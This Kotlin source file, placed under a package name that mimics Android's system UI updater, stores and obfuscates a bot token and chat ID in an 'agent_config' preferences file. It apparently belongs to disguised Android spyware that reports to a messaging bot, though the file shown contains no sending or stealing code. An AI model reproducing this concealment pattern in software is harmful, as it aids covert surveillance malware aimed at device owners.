package com.android.systemui.updater

import android.content.Context
import android.content.SharedPreferences
import com.android.systemui.updater.util.Obfuscator

object EncryptedConfig {
    private const val PREFS_NAME = "agent_config"
    private const val KEY_BOT_TOKEN = "bot_token"
    private const val KEY_CHAT_ID = "chat_id"
    private const val KEY_INITIALIZED = "initialized"

    private lateinit var prefs: SharedPreferences

    fun getInstance(context: Context): EncryptedConfig {
        prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return this
    }

    fun getBotToken(): String {
        val encrypted = prefs.getString(KEY_BOT_TOKEN, "") ?: ""
        return if (encrypted.isNotEmpty()) {
            try { Obfuscator.decrypt(encrypted) } catch (e: Exception) { "" }
        } else ""
    }

    fun getChatId(): String {
        val encrypted = prefs.getString(KEY_CHAT_ID, "") ?: ""
        return if (encrypted.isNotEmpty()) {
            try { Obfuscator.decrypt(encrypted) } catch (e: Exception) { "" }
        } else ""
    }

    fun initializeIfNeeded(token: String, chatId: String) {
        if (prefs.getBoolean(KEY_INITIALIZED, false)) return
        val encryptedToken = Obfuscator.encrypt(token)
        val encryptedChatId = Obfuscator.encrypt(chatId)
        prefs.edit()
            .putString(KEY_BOT_TOKEN, encryptedToken)
            .putString(KEY_CHAT_ID, encryptedChatId)
            .putBoolean(KEY_INITIALIZED, true)
            .apply()
    }
}
